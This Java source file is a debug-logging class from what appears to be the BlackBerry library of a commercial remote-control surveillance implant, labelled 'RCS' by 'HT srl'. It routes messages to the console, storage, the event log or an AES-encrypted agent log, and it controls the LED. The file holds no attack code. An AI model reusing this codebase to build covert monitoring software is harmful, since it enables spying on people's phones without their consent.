//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Debug.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.debug;

import java.util.Date;

import net.rim.device.api.i18n.DateFormat;
import net.rim.device.api.system.EventLogger;
import net.rim.device.api.system.LED;
import net.rim.device.api.util.NumberUtilities;
import blackberry.agent.Agent;
import blackberry.config.Conf;
import blackberry.config.Keys;
import blackberry.fs.Path;
import blackberry.log.Log;
import blackberry.utils.Check;

/**
 * The Class Debug.
 */
public final class Debug {

    public static int level = 6;

    static DebugWriter debugWriter;
    static Log logInfo;

    private static boolean logToDebugger = true;
    private static boolean logToSD = false;
    private static boolean logToFlash = false;
    private static boolean logToEvents = false;
    private static boolean logToInfo = false;

    private static boolean enabled = true;
    private static boolean init = false;

    //                  1234567890123456
    String className = "                ";

    int actualLevel = 6;

    //#ifdef EVENTLOGGER
    public static long loggerEventId = 0x98f417b7dbfd6ae4L;

    //#endif

    /*
     * prior: priorita', da 6 bassa a bassa, level LEVEL = {
     * TRACE,DEBUG,INFO,WARN, ERROR, FATAL }
     */

    /**
     * Instantiates a new debug.
     * 
     * @param className_
     *            the class name_
     */
    public Debug(final String className_) {
        this(className_, DebugLevel.VERBOSE);
    }

    /**
     * Instantiates a new debug.
     * 
     * @param className_
     *            the class name_
     * @param classLevel
     *            the class level
     */
    public Debug(final String className_, final int classLevel) {

        //#ifdef DBC
        Check.requires(className_ != null, "className_ void");
        Check.requires(className_.length() > 0, "className_ empty");
        //#endif

        final int len = className_.length();

        //#ifdef DBC
        Check.requires(len <= className.length(), "Classname too long");
        //#endif

        className = className_ + className.substring(len);
        actualLevel = Math.min(classLevel, level);

        //trace("Level: " + actualLevel);
    }

    public static boolean isInitialized() {
        return init;
    }

    /**
     * Inits the.
     * 
     * @param logToDebugger_
     *            the log to console
     * @param logToSD_
     *            the log to SD
     * @param logToFlash_
     *            the log to internal Flash
     * @param logToEvents_
     *            the log to events_
     * @return true, if successful
     */
    public static boolean init() {
        //#ifdef DBC
        //Check.requires(Path.isInizialized(), "init: Path not initialized");
        //#endif

        if (isInitialized()) {
            return false;
        }

        Debug.logToDebugger = Conf.DEBUG_OUT;
        Debug.logToSD = Conf.DEBUG_OUT;
        Debug.logToFlash = Conf.DEBUG_FLASH;
        Debug.logToEvents = Conf.DEBUG_EVENTS;
        Debug.logToInfo = Conf.DEBUG_INFO;

        if (logToFlash || logToSD) {
            Path.makeDirs();
            debugWriter = DebugWriter.getInstance();
            debugWriter.logToSD = logToSD;
            if (!debugWriter.isAlive()) {
                debugWriter.start();
            }
        }

        if (logToEvents) {
            //#ifdef EVENTLOGGER
            EventLogger.register(loggerEventId, "BBB",
                    EventLogger.VIEWER_STRING);
            EventLogger.setMinimumLevel(EventLogger.DEBUG_INFO);
            //#endif
        }

        init = true;
        return true;
    }

    /**
     * Stop.
     */
    public static synchronized void stop() {
        init = false;
        if (debugWriter != null) {
            debugWriter.requestStop();

            try {
                debugWriter.join();
            } catch (final InterruptedException e) {
            }
        }
    }

    /**
     * Trace.
     * 
     * @param message
     *            the message
     */
    public void trace(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("-   - " + className + " | " + message, DebugLevel.VERBOSE);
        }
        //#endif
    }

    /**
     * Info.
     * 
     * @param message
     *            the message
     */
    public void info(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("-INF- " + className + " | " + message, DebugLevel.NOTIFY);
        }

        //#endif
    }

    /**
     * Warn.
     * 
     * @param message
     *            the message
     */
    public void warn(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("-WRN- " + className + " | " + message, DebugLevel.LOW);
        }

        //#endif
    }

    /**
     * Warn.
     * 
     * @param message
     *            the message
     */
    public void warn(final Exception ex) {
        //#ifdef DEBUG
        if (enabled) {
            trace("-WRN- " + className + " | " + ex, DebugLevel.LOW);
        }

        //#endif
    }

    /**
     * Error.
     * 
     * @param message
     *            the message
     */
    public void error(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("#ERR# " + className + " | " + message, DebugLevel.HIGH);
        }

        //#endif
    }

    /**
     * Error.
     * 
     * @param message
     *            the message
     */
    public void error(final Exception ex) {
        //#ifdef DEBUG
        if (enabled) {
            trace("#ERR# " + className + " | " + ex, DebugLevel.HIGH);
            ex.printStackTrace();
        }

        //#endif
    }

    /**
     * Fatal.
     * 
     * @param message
     *            the message
     */
    public void fatal(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("#FTL# " + className + " | " + message, DebugLevel.CRITICAL);
        }

        //#endif
    }

    public void fatal(final Exception ex) {
        //#ifdef DEBUG
        if (enabled) {
            trace("#FTL# " + className + " | " + ex, DebugLevel.CRITICAL);
            ex.printStackTrace();
        }
        //#endif
    }

    private void logToDebugger(final String string, final int priority) {
        System.out.println(Thread.currentThread().getName() + " " + string);
    }

    private void logToEvents(final String logMessage, final int priority) {
        //#ifdef EVENTLOGGER
        //EventLogger.register(loggerEventId, "BBB", EventLogger.VIEWER_STRING);

        if (!EventLogger.logEvent(loggerEventId, logMessage.getBytes(),
                priority)) {
            logToDebugger("cannot write to EventLogger", priority);
        }
        //#endif
    }

    private void logToFile(final String message, final int priority) {

        //#ifdef DBC
        Check.requires(debugWriter != null, "logToFile: debugWriter null");
        Check.requires(logToFlash || logToSD, "! (logToFlash || logToSD)");
        //#endif

        final boolean ret = debugWriter.append(message);

        if (ret == false) {
            // procedura in caso di mancata scrittura
            if (Debug.logToDebugger) {
                logToDebugger("debugWriter.append returns false",
                        DebugLevel.ERROR);
            }
        }
    }

    public static void logToInfo(final String message, final int priority) {
        //#ifdef DBC
        Check.requires(logToInfo, "!logToInfo");
        //#endif

        if (logInfo == null) {

            if (!Keys.isInstanced()) {
                return;
            }

            logInfo = new Log(Agent.AGENT_INFO, false, Keys.getInstance()
                    .getAesKey());
        }

        logInfo.createLog(null);
        logInfo.writeLog(message, true);
        logInfo.close();
    }

    /*
     * Scrive su file il messaggio, in append. Pu� scegliere se scrivere su
     * /store o su /SDCard Alla partenza dell'applicativo la SDCard non �
     * visibile.
     */
    private void trace(final String message, final int priority) {
        //#ifdef DBC
        Check.requires(priority > 0, "priority >0");
        //#endif

        if (priority > actualLevel || message == null) {
            return;
        }

        if (logToDebugger) {
            logToDebugger(message, priority);
        }

        if (!isInitialized()) {
            return;
        }

        if (logToSD || logToFlash) {
            final long timestamp = (new Date()).getTime();
            /*
             * Calendar calendar = Calendar.getInstance(); calendar.setTime(new
             * Date());
             */

            final DateFormat formatTime = DateFormat
                    .getInstance(DateFormat.TIME_FULL);

            final String time = formatTime.formatLocal(timestamp).substring(0,
                    8);
            String milli = NumberUtilities.toString(timestamp % 1000, 10, 3);

            /*
             * String time = calendar.get(Calendar.HOUR)+":"+
             * calendar.get(Calendar.MINUTE)+":"+ calendar.get(Calendar.SECOND);
             */

            logToFile(time + " " + milli + " " + message, priority);
        }

        if (logToEvents) {
            logToEvents(message, priority);
        }

        if (logToInfo) {
            if (priority <= DebugLevel.ERROR) {
                logToInfo(message, priority);
            }
        }
    }

    public void ledStart(int color) {
        try {
            LED.setConfiguration(LED.LED_TYPE_STATUS, 1000, 1000,
                    LED.BRIGHTNESS_12);
            LED.setColorConfiguration(1000, 1000, color);
            LED.setState(LED.STATE_BLINKING);

        } catch (final Exception ex) {

        }
    }

    public void ledStop() {
        try {
            LED.setState(LED.STATE_OFF);
        } catch (final Exception ex) {

        }
    }

}
